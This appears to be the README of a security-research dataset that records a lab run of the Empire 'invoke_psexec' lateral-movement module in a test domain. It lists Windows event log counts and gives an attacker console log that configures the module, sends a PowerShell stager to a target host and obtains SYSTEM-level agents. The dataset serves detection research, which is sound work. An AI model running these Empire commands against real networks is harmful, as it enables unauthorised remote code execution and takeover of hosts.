# Empire Invoke Psexec

Executes a stager on remote hosts using PsExec type functionality.

## Technique(s) ID

T1035

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_invoke_psexec.tar.gz](./empire_invoke_psexec.tar.gz)

## Network Environment

Shire

## Time Taken

2019-05-18210652

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |             574 |
| Windows PowerShell                         | PowerShell                          | Provider Lifecycle                                     |              14 |
| Windows PowerShell                         | PowerShell                          | Engine Lifecycle                                       |               2 |
| System                                     | Service Control Manager             | na                                                     |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             169 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |              91 |
| Security                                   | Microsoft-Windows-Security-Auditing | Registry                                               |              32 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              10 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |               5 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Kerberos Service Ticket Operations                     |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |               1 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security System Extension                              |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               3 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |             455 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |             423 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |             329 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             152 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |              24 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              20 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |              14 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |               6 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |               2 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               1 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process terminated (rule: ProcessTerminate)            |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             498 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Console Startup                             |               2 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Execute a Remote Command                               |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | PowerShell Named Pipe IPC                              |               1 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Starting Command                                       |               1 |

## Attacker Activity

```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) > 
(Empire: powershell/lateral_movement/invoke_psexec) > info

              Name: Invoke-PsExec
            Module: powershell/lateral_movement/invoke_psexec
        NeedsAdmin: False
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Executes a stager on remote hosts using PsExec type
  functionality.

Comments:
  https://github.com/rapid7/metasploit-
  framework/blob/master/tools/psexec.rb

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  ProxyCreds   False       default                   Proxy credentials                       
                                                     ([domain\]username:password) to use for 
                                                     request (default, none, or other).      
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                     separated.                              
  ServiceName  True        Updater                   The name of the service to create.      
  Command      False                                 Custom command to execute on remote     
                                                     hosts.                                  
  Proxy        False       default                   Proxy to use for request (default, none,
                                                     or other).                              
  UserAgent    False       default                   User-agent string to use for the staging
                                                     request (default, none, or other).      
  Agent        True        V6W3TH8Y                  Agent to run module on.                 
  ResultFile   False                                 Name of the file to write the results to
                                                     on agent machine.                       

(Empire: powershell/lateral_movement/invoke_psexec) > set Listener https
(Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_psexec) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_JOB
[*] Agent V6W3TH8Y tasked with task ID 2
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_psexec
(Empire: powershell/lateral_movement/invoke_psexec) > Job started: 9GY4PC
[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
[*] New agent EXBNZYTS checked in
[+] Initial agent EXBNZYTS from 10.0.10.103 now active (Slack)
[*] Sending agent (stage 2) to EXBNZYTS at 10.0.10.103

(Empire: powershell/lateral_movement/invoke_psexec) > 
(Empire: powershell/lateral_movement/invoke_psexec) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:07:43  https           
 TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:07:42  https           
 EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:07:44  https           

 V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:07:42  https           
 XSZ91N7T ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         4172   5/0.0    2019-05-18 21:07:43  https           
 EXBNZYTS ps 172.18.39.105   IT001             *SHIRE\SYSTEM           powershell         6728   5/0.0    2019-05-18 21:07:42  https           


(Empire: agents) > 
```